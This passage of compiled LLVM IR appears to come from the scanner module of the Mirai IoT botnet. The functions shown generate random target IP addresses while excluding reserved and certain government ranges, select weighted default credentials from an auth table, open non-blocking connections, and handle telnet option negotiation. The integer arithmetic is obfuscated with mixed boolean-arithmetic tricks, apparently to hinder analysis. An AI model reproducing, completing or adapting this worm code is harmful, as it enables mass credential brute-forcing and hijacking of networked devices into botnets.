  %32 = and i32 %31, %29
  %33 = and i32 %29, 255
  %34 = trunc i32 %32 to i8
  store i8 %34, i8* %5, align 1
  br label %35

; <label>:35:                                     ; preds = %6
  %36 = load i8, i8* %2, align 1
  %37 = zext i8 %36 to i32
  %38 = icmp eq i32 %37, 127
  br i1 %38, label %237, label %39

; <label>:39:                                     ; preds = %35
  %40 = load i8, i8* %2, align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %237, label %43

; <label>:43:                                     ; preds = %39
  %44 = load i8, i8* %2, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 3
  br i1 %46, label %237, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i8, i8* %2, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 15
  br i1 %50, label %237, label %51

; <label>:51:                                     ; preds = %47
  %52 = load i8, i8* %2, align 1
  %53 = zext i8 %52 to i32
  %54 = icmp eq i32 %53, 16
  br i1 %54, label %237, label %55

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* %2, align 1
  %57 = zext i8 %56 to i32
  %58 = icmp eq i32 %57, 56
  br i1 %58, label %237, label %59

; <label>:59:                                     ; preds = %55
  %60 = load i8, i8* %2, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 10
  br i1 %62, label %237, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* %2, align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 192
  br i1 %66, label %67, label %71

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* %3, align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 168
  br i1 %70, label %237, label %71

; <label>:71:                                     ; preds = %67, %63
  %72 = load i8, i8* %2, align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 172
  br i1 %74, label %75, label %83

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* %3, align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sge i32 %77, 16
  br i1 %78, label %79, label %83

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* %3, align 1
  %81 = zext i8 %80 to i32
  %82 = icmp slt i32 %81, 32
  br i1 %82, label %237, label %83

; <label>:83:                                     ; preds = %79, %75, %71
  %84 = load i8, i8* %2, align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 100
  br i1 %86, label %87, label %95

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* %3, align 1
  %89 = zext i8 %88 to i32
  %90 = icmp sge i32 %89, 64
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* %3, align 1
  %93 = zext i8 %92 to i32
  %94 = icmp slt i32 %93, 127
  br i1 %94, label %237, label %95

; <label>:95:                                     ; preds = %91, %87, %83
  %96 = load i8, i8* %2, align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 169
  br i1 %98, label %99, label %103

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* %3, align 1
  %101 = zext i8 %100 to i32
  %102 = icmp sgt i32 %101, 254
  br i1 %102, label %237, label %103

; <label>:103:                                    ; preds = %99, %95
  %104 = load i8, i8* %2, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 198
  br i1 %106, label %107, label %115

; <label>:107:                                    ; preds = %103
  %108 = load i8, i8* %3, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp sge i32 %109, 18
  br i1 %110, label %111, label %115

; <label>:111:                                    ; preds = %107
  %112 = load i8, i8* %3, align 1
  %113 = zext i8 %112 to i32
  %114 = icmp slt i32 %113, 20
  br i1 %114, label %237, label %115

; <label>:115:                                    ; preds = %111, %107, %103
  %116 = load i8, i8* %2, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp sge i32 %117, 224
  br i1 %118, label %237, label %119

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* %2, align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 106
  br i1 %122, label %123, label %127

; <label>:123:                                    ; preds = %119
  %124 = load i8, i8* %3, align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 186
  br i1 %126, label %237, label %127

; <label>:127:                                    ; preds = %123, %119
  %128 = load i8, i8* %2, align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 106
  br i1 %130, label %131, label %135

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* %3, align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 187
  br i1 %134, label %237, label %135

; <label>:135:                                    ; preds = %131, %127
  %136 = load i8, i8* %2, align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 106
  br i1 %138, label %139, label %143

; <label>:139:                                    ; preds = %135
  %140 = load i8, i8* %3, align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 185
  br i1 %142, label %237, label %143

; <label>:143:                                    ; preds = %139, %135
  %144 = load i8, i8* %2, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 106
  br i1 %146, label %147, label %151

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* %3, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 184
  br i1 %150, label %237, label %151

; <label>:151:                                    ; preds = %147, %143
  %152 = load i8, i8* %2, align 1
  %153 = zext i8 %152 to i32
  %154 = icmp eq i32 %153, 150
  br i1 %154, label %155, label %159

; <label>:155:                                    ; preds = %151
  %156 = load i8, i8* %3, align 1
  %157 = zext i8 %156 to i32
  %158 = icmp eq i32 %157, 31
  br i1 %158, label %237, label %159

; <label>:159:                                    ; preds = %155, %151
  %160 = load i8, i8* %2, align 1
  %161 = zext i8 %160 to i32
  %162 = icmp eq i32 %161, 49
  br i1 %162, label %163, label %167

; <label>:163:                                    ; preds = %159
  %164 = load i8, i8* %3, align 1
  %165 = zext i8 %164 to i32
  %166 = icmp eq i32 %165, 51
  br i1 %166, label %237, label %167

; <label>:167:                                    ; preds = %163, %159
  %168 = load i8, i8* %2, align 1
  %169 = zext i8 %168 to i32
  %170 = icmp eq i32 %169, 178
  br i1 %170, label %171, label %175

; <label>:171:                                    ; preds = %167
  %172 = load i8, i8* %3, align 1
  %173 = zext i8 %172 to i32
  %174 = icmp eq i32 %173, 62
  br i1 %174, label %237, label %175

; <label>:175:                                    ; preds = %171, %167
  %176 = load i8, i8* %2, align 1
  %177 = zext i8 %176 to i32
  %178 = icmp eq i32 %177, 160
  br i1 %178, label %179, label %183

; <label>:179:                                    ; preds = %175
  %180 = load i8, i8* %3, align 1
  %181 = zext i8 %180 to i32
  %182 = icmp eq i32 %181, 13
  br i1 %182, label %237, label %183

; <label>:183:                                    ; preds = %179, %175
  %184 = load i8, i8* %2, align 1
  %185 = zext i8 %184 to i32
  %186 = icmp eq i32 %185, 6
  br i1 %186, label %235, label %187

; <label>:187:                                    ; preds = %183
  %188 = load i8, i8* %2, align 1
  %189 = zext i8 %188 to i32
  %190 = icmp eq i32 %189, 7
  br i1 %190, label %235, label %191

; <label>:191:                                    ; preds = %187
  %192 = load i8, i8* %2, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp eq i32 %193, 11
  br i1 %194, label %235, label %195

; <label>:195:                                    ; preds = %191
  %196 = load i8, i8* %2, align 1
  %197 = zext i8 %196 to i32
  %198 = icmp eq i32 %197, 21
  br i1 %198, label %235, label %199

; <label>:199:                                    ; preds = %195
  %200 = load i8, i8* %2, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 22
  br i1 %202, label %235, label %203

; <label>:203:                                    ; preds = %199
  %204 = load i8, i8* %2, align 1
  %205 = zext i8 %204 to i32
  %206 = icmp eq i32 %205, 26
  br i1 %206, label %235, label %207

; <label>:207:                                    ; preds = %203
  %208 = load i8, i8* %2, align 1
  %209 = zext i8 %208 to i32
  %210 = icmp eq i32 %209, 28
  br i1 %210, label %235, label %211

; <label>:211:                                    ; preds = %207
  %212 = load i8, i8* %2, align 1
  %213 = zext i8 %212 to i32
  %214 = icmp eq i32 %213, 29
  br i1 %214, label %235, label %215

; <label>:215:                                    ; preds = %211
  %216 = load i8, i8* %2, align 1
  %217 = zext i8 %216 to i32
  %218 = icmp eq i32 %217, 30
  br i1 %218, label %235, label %219

; <label>:219:                                    ; preds = %215
  %220 = load i8, i8* %2, align 1
  %221 = zext i8 %220 to i32
  %222 = icmp eq i32 %221, 33
  br i1 %222, label %235, label %223

; <label>:223:                                    ; preds = %219
  %224 = load i8, i8* %2, align 1
  %225 = zext i8 %224 to i32
  %226 = icmp eq i32 %225, 55
  br i1 %226, label %235, label %227

; <label>:227:                                    ; preds = %223
  %228 = load i8, i8* %2, align 1
  %229 = zext i8 %228 to i32
  %230 = icmp eq i32 %229, 214
  br i1 %230, label %235, label %231

; <label>:231:                                    ; preds = %227
  %232 = load i8, i8* %2, align 1
  %233 = zext i8 %232 to i32
  %234 = icmp eq i32 %233, 215
  br label %235

; <label>:235:                                    ; preds = %231, %227, %223, %219, %215, %211, %207, %203, %199, %195, %191, %187, %183
  %236 = phi i1 [ true, %227 ], [ true, %223 ], [ true, %219 ], [ true, %215 ], [ true, %211 ], [ true, %207 ], [ true, %203 ], [ true, %199 ], [ true, %195 ], [ true, %191 ], [ true, %187 ], [ true, %183 ], [ %234, %231 ]
  br label %237

; <label>:237:                                    ; preds = %235, %179, %171, %163, %155, %147, %139, %131, %123, %115, %111, %99, %91, %79, %67, %59, %55, %51, %47, %43, %39, %35
  %238 = phi i1 [ true, %179 ], [ true, %171 ], [ true, %163 ], [ true, %155 ], [ true, %147 ], [ true, %139 ], [ true, %131 ], [ true, %123 ], [ true, %115 ], [ true, %111 ], [ true, %99 ], [ true, %91 ], [ true, %79 ], [ true, %67 ], [ true, %59 ], [ true, %55 ], [ true, %51 ], [ true, %47 ], [ true, %43 ], [ true, %39 ], [ true, %35 ], [ %236, %235 ]
  br i1 %238, label %6, label %239

; <label>:239:                                    ; preds = %237
  %240 = load i8, i8* %2, align 1
  %241 = zext i8 %240 to i32
  %242 = shl i32 %241, 24
  %243 = load i8, i8* %3, align 1
  %244 = zext i8 %243 to i32
  %245 = shl i32 %244, 16
  %246 = xor i32 %242, -1
  %247 = xor i32 %245, -1
  %248 = xor i32 -1358371380, -1
  %249 = and i32 %246, -1358371380
  %250 = and i32 %242, %248
  %251 = and i32 %247, -1358371380
  %252 = and i32 %245, %248
  %253 = or i32 %249, %250
  %254 = or i32 %251, %252
  %255 = xor i32 %253, %254
  %256 = or i32 %246, %247
  %257 = xor i32 %256, -1
  %258 = or i32 -1358371380, %248
  %259 = and i32 %257, %258
  %260 = or i32 %255, %259
  %261 = or i32 %242, %245
  %262 = load i8, i8* %4, align 1
  %263 = zext i8 %262 to i32
  %264 = shl i32 %263, 8
  %265 = xor i32 %260, -1
  %266 = xor i32 %264, -1
  %267 = xor i32 -1388396003, -1
  %268 = and i32 %265, -1388396003
  %269 = and i32 %260, %267
  %270 = and i32 %266, -1388396003
  %271 = and i32 %264, %267
  %272 = or i32 %268, %269
  %273 = or i32 %270, %271
  %274 = xor i32 %272, %273
  %275 = or i32 %265, %266
  %276 = xor i32 %275, -1
  %277 = or i32 -1388396003, %267
  %278 = and i32 %276, %277
  %279 = or i32 %274, %278
  %280 = or i32 %260, %264
  %281 = load i8, i8* %5, align 1
  %282 = zext i8 %281 to i32
  %283 = shl i32 %282, 0
  %284 = xor i32 %279, -1
  %285 = xor i32 %283, -1
  %286 = xor i32 -1592855687, -1
  %287 = and i32 %284, -1592855687
  %288 = and i32 %279, %286
  %289 = and i32 %285, -1592855687
  %290 = and i32 %283, %286
  %291 = or i32 %287, %288
  %292 = or i32 %289, %290
  %293 = xor i32 %291, %292
  %294 = or i32 %284, %285
  %295 = xor i32 %294, -1
  %296 = or i32 -1592855687, %286
  %297 = and i32 %295, %296
  %298 = or i32 %293, %297
  %299 = or i32 %279, %283
  %300 = call i32 @htonl(i32 %298) #7
  ret i32 %300
}

; Function Attrs: noinline nounwind uwtable
define internal void @setup_connection(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  %5 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 16, i32 4, i1 false)
  %6 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %7 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %6, i32 0, i32 1
  %8 = load i32, i32* %7, align 8
  %9 = icmp ne i32 %8, -1
  br i1 %9, label %10, label %15

; <label>:10:                                     ; preds = %1
  %11 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %12 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %11, i32 0, i32 1
  %13 = load i32, i32* %12, align 8
  %14 = call i32 @close(i32 %13)
  br label %15

; <label>:15:                                     ; preds = %10, %1
  %16 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %17 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %18 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %17, i32 0, i32 1
  store i32 %16, i32* %18, align 8
  %19 = icmp eq i32 %16, -1
  br i1 %19, label %20, label %21

; <label>:20:                                     ; preds = %15
  br label %74

; <label>:21:                                     ; preds = %15
  %22 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %22, i32 0, i32 6
  store i32 0, i32* %23, align 4
  %24 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %25 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %24, i32 0, i32 7
  %26 = getelementptr inbounds [256 x i8], [256 x i8]* %25, i32 0, i32 0
  call void @util_zero(i8* %26, i32 256)
  %27 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %27, i32 0, i32 1
  %29 = load i32, i32* %28, align 8
  %30 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %31 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %30, i32 0, i32 1
  %32 = load i32, i32* %31, align 8
  %33 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 3, i32 0)
  %34 = xor i32 2048, -1
  %35 = xor i32 %33, -1
  %36 = xor i32 -1461232192, -1
  %37 = and i32 %34, -1461232192
  %38 = and i32 2048, %36
  %39 = and i32 %35, -1461232192
  %40 = and i32 %33, %36
  %41 = or i32 %37, %38
  %42 = or i32 %39, %40
  %43 = xor i32 %41, %42
  %44 = or i32 %34, %35
  %45 = xor i32 %44, -1
  %46 = or i32 -1461232192, %36
  %47 = and i32 %45, %46
  %48 = or i32 %43, %47
  %49 = or i32 2048, %33
  %50 = call i32 (i32, i32, ...) @fcntl(i32 %29, i32 4, i32 %48)
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %51, align 4
  %52 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %53 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %52, i32 0, i32 4
  %54 = load i32, i32* %53, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %56 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %55, i32 0, i32 0
  store i32 %54, i32* %56, align 4
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %57, i32 0, i32 5
  %59 = load i16, i16* %58, align 8
  %60 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %59, i16* %60, align 2
  %61 = load i32, i32* @fake_time, align 4
  %62 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %63 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %62, i32 0, i32 2
  store i32 %61, i32* %63, align 4
  %64 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %65 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %64, i32 0, i32 3
  store i32 1, i32* %65, align 8
  %66 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %67 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %66, i32 0, i32 1
  %68 = load i32, i32* %67, align 8
  %69 = bitcast %union.__CONST_SOCKADDR_ARG* %4 to %struct.sockaddr**
  %70 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  store %struct.sockaddr* %70, %struct.sockaddr** %69, align 8
  %71 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %4, i32 0, i32 0
  %72 = load %struct.sockaddr*, %struct.sockaddr** %71, align 8
  %73 = call i32 @connect(i32 %68, %struct.sockaddr* %72, i32 16)
  br label %74

; <label>:74:                                     ; preds = %21, %20
  ret void
}

declare i32 @select(i32, %struct.fd_set.26*, %struct.fd_set.26*, %struct.fd_set.26*, %struct.timeval.27*) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

; Function Attrs: noinline nounwind uwtable
define internal %struct.scanner_auth* @random_auth_entry() #0 {
  %1 = alloca %struct.scanner_auth*, align 8
  %2 = alloca i32, align 4
  %3 = alloca i16, align 2
  %4 = call i32 @rand_next()
  %5 = load i16, i16* @auth_table_max_weight, align 2
  %6 = zext i16 %5 to i32
  %7 = urem i32 %4, %6
  %8 = trunc i32 %7 to i16
  store i16 %8, i16* %3, align 2
  store i32 0, i32* %2, align 4
  br label %9

; <label>:9:                                      ; preds = %43, %0
  %10 = load i32, i32* %2, align 4
  %11 = load i32, i32* @auth_table_len, align 4
  %12 = icmp slt i32 %10, %11
  br i1 %12, label %13, label %50

; <label>:13:                                     ; preds = %9
  %14 = load i16, i16* %3, align 2
  %15 = zext i16 %14 to i32
  %16 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %16, i64 %18
  %20 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %19, i32 0, i32 2
  %21 = load i16, i16* %20, align 8
  %22 = zext i16 %21 to i32
  %23 = icmp slt i32 %15, %22
  br i1 %23, label %24, label %25

; <label>:24:                                     ; preds = %13
  br label %43

; <label>:25:                                     ; preds = %13
  %26 = load i16, i16* %3, align 2
  %27 = zext i16 %26 to i32
  %28 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %29 = load i32, i32* %2, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %28, i64 %30
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %31, i32 0, i32 3
  %33 = load i16, i16* %32, align 2
  %34 = zext i16 %33 to i32
  %35 = icmp slt i32 %27, %34
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %25
  %37 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %38 = load i32, i32* %2, align 4
  %39 = sext i32 %38 to i64
  %40 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %37, i64 %39
  store %struct.scanner_auth* %40, %struct.scanner_auth** %1, align 8
  br label %51

; <label>:41:                                     ; preds = %25
  br label %42

; <label>:42:                                     ; preds = %41
  br label %43

; <label>:43:                                     ; preds = %42, %24
  %44 = load i32, i32* %2, align 4
  %45 = sub i32 0, %44
  %46 = sub i32 0, 1
  %47 = add i32 %45, %46
  %48 = sub i32 0, %47
  %49 = add nsw i32 %44, 1
  store i32 %48, i32* %2, align 4
  br label %9

; <label>:50:                                     ; preds = %9
  store %struct.scanner_auth* null, %struct.scanner_auth** %1, align 8
  br label %51

; <label>:51:                                     ; preds = %50, %36
  %52 = load %struct.scanner_auth*, %struct.scanner_auth** %1, align 8
  ret %struct.scanner_auth* %52
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  %11 = load i32, i32* %5, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = load i32, i32* %7, align 4
  %14 = sext i32 %13 to i64
  %15 = load i32, i32* %8, align 4
  %16 = call i64 @recv(i32 %11, i8* %12, i64 %14, i32 %15)
  %17 = trunc i64 %16 to i32
  store i32 %17, i32* %9, align 4
  %18 = load i32, i32* %9, align 4
  %19 = icmp sgt i32 %18, 0
  br i1 %19, label %20, label %46

; <label>:20:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %21

; <label>:21:                                     ; preds = %39, %20
  %22 = load i32, i32* %10, align 4
  %23 = load i32, i32* %9, align 4
  %24 = icmp slt i32 %22, %23
  br i1 %24, label %25, label %45

; <label>:25:                                     ; preds = %21
  %26 = load i8*, i8** %6, align 8
  %27 = load i32, i32* %10, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8, i8* %26, i64 %28
  %30 = load i8, i8* %29, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %38

; <label>:33:                                     ; preds = %25
  %34 = load i8*, i8** %6, align 8
  %35 = load i32, i32* %10, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds i8, i8* %34, i64 %36
  store i8 65, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %33, %25
  br label %39

; <label>:39:                                     ; preds = %38
  %40 = load i32, i32* %10, align 4
  %41 = add i32 %40, 508211106
  %42 = add i32 %41, 1
  %43 = sub i32 %42, 508211106
  %44 = add nsw i32 %40, 1
  store i32 %43, i32* %10, align 4
  br label %21

; <label>:45:                                     ; preds = %21
  br label %46

; <label>:46:                                     ; preds = %45, %4
  %47 = load i32, i32* %9, align 4
  ret i32 %47
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @consume_iacs(%struct.scanner_connection*) #0 {
  %2 = alloca %struct.scanner_connection*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca [3 x i8], align 1
  %7 = alloca [9 x i8], align 1
  store %struct.scanner_connection* %0, %struct.scanner_connection** %2, align 8
  store i32 0, i32* %3, align 4
  %8 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %9 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %8, i32 0, i32 7
  %10 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i32 0, i32 0
  store i8* %10, i8** %4, align 8
  br label %11

; <label>:11:                                     ; preds = %149, %40, %1
  %12 = load i32, i32* %3, align 4
  %13 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %13, i32 0, i32 6
  %15 = load i32, i32* %14, align 4
  %16 = icmp slt i32 %12, %15
  br i1 %16, label %17, label %150

; <label>:17:                                     ; preds = %11
  %18 = load i8*, i8** %4, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 255
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %17
  br label %150

; <label>:23:                                     ; preds = %17
  %24 = load i8*, i8** %4, align 8
  %25 = load i8, i8* %24, align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 255
  br i1 %27, label %28, label %148

; <label>:28:                                     ; preds = %23
  %29 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %30 = load i8*, i8** %4, align 8
  %31 = call signext i8 @can_consume(%struct.scanner_connection* %29, i8* %30, i32 1)
  %32 = icmp ne i8 %31, 0
  br i1 %32, label %34, label %33

; <label>:33:                                     ; preds = %28
  br label %150

; <label>:34:                                     ; preds = %28
  %35 = load i8*, i8** %4, align 8
  %36 = getelementptr inbounds i8, i8* %35, i64 1
  %37 = load i8, i8* %36, align 1
  %38 = zext i8 %37 to i32
  %39 = icmp eq i32 %38, 255
  br i1 %39, label %40, label %48

; <label>:40:                                     ; preds = %34
  %41 = load i8*, i8** %4, align 8
  %42 = getelementptr inbounds i8, i8* %41, i64 2
  store i8* %42, i8** %4, align 8
  %43 = load i32, i32* %3, align 4
  %44 = sub i32 %43, -676818042
  %45 = add i32 %44, 2
  %46 = add i32 %45, -676818042
  %47 = add nsw i32 %43, 2
  store i32 %46, i32* %3, align 4
  br label %11

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8, i8* %50, align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 253
  br i1 %53, label %54, label %88

; <label>:54:                                     ; preds = %48
  %55 = bitcast [3 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %55, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @consume_iacs.tmp1, i32 0, i32 0), i64 3, i32 1, i1 false)
  %56 = bitcast [9 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %56, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @consume_iacs.tmp2, i32 0, i32 0), i64 9, i32 1, i1 false)
  %57 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %58 = load i8*, i8** %4, align 8
  %59 = call signext i8 @can_consume(%struct.scanner_connection* %57, i8* %58, i32 2)
  %60 = icmp ne i8 %59, 0
  br i1 %60, label %62, label %61

; <label>:61:                                     ; preds = %54
  br label %150

; <label>:62:                                     ; preds = %54
  %63 = load i8*, i8** %4, align 8
  %64 = getelementptr inbounds i8, i8* %63, i64 2
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = icmp ne i32 %66, 31
  br i1 %67, label %68, label %69

; <label>:68:                                     ; preds = %62
  br label %89

; <label>:69:                                     ; preds = %62
  %70 = load i8*, i8** %4, align 8
  %71 = getelementptr inbounds i8, i8* %70, i64 3
  store i8* %71, i8** %4, align 8
  %72 = load i32, i32* %3, align 4
  %73 = sub i32 0, %72
  %74 = sub i32 0, 3
  %75 = add i32 %73, %74
  %76 = sub i32 0, %75
  %77 = add nsw i32 %72, 3
  store i32 %76, i32* %3, align 4
  %78 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %79 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %78, i32 0, i32 1
  %80 = load i32, i32* %79, align 8
  %81 = getelementptr inbounds [3 x i8], [3 x i8]* %6, i32 0, i32 0
  %82 = call i64 @send(i32 %80, i8* %81, i64 3, i32 16384)
  %83 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %84 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %83, i32 0, i32 1
  %85 = load i32, i32* %84, align 8
  %86 = getelementptr inbounds [9 x i8], [9 x i8]* %7, i32 0, i32 0
  %87 = call i64 @send(i32 %85, i8* %86, i64 9, i32 16384)
  br label %146

; <label>:88:                                     ; preds = %48
  br label %89

; <label>:89:                                     ; preds = %88, %68
  %90 = load %struct.scanner_connection*, %struct.scanner_connection** %2, align 8
  %91 = load i8*, i8** %4, align 8
  %92 = call signext i8 @can_consume(%struct.scanner_connection* %90, i8* %91, i32 2)
  %93 = icmp ne i8 %92, 0
  br i1 %93, label %95, label %94

; <label>:94:                                     ; preds = %89
  br label %150

; <label>:95:                                     ; preds = %89
  store i32 0, i32* %5, align 4
  br label %96

; <label>:96:                                     ; preds = %127, %95
  %97 = load i32, i32* %5, align 4
  %98 = icmp slt i32 %97, 3
  br i1 %98, label %99, label %133

; <label>:99:                                     ; preds = %96
  %100 = load i8*, i8** %4, align 8
  %101 = load i32, i32* %5, align 4
  %102 = sext i32 %101 to i64
  %103 = getelementptr inbounds i8, i8* %100, i64 %102
  %104 = load i8, i8* %103, align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 253
  br i1 %106, label %107, label %112

; <label>:107:                                    ; preds = %99
  %108 = load i8*, i8** %4, align 8
  %109 = load i32, i32* %5, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8, i8* %108, i64 %110
  store i8 -4, i8* %111, align 1
  br label %126

; <label>:112:                                    ; preds = %99
  %113 = load i8*, i8** %4, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds i8, i8* %113, i64 %115
  %117 = load i8, i8* %116, align 1
  %118 = zext i8 %117 to i32
  %119 = icmp eq i32 %118, 251
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %112
  %121 = load i8*, i8** %4, align 8
  %122 = load i32, i32* %5, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds i8, i8* %121, i64 %123
  store i8 -3, i8* %124, align 1
  br label %125

; <label>:125:                                    ; preds = %120, %112
  br label %126

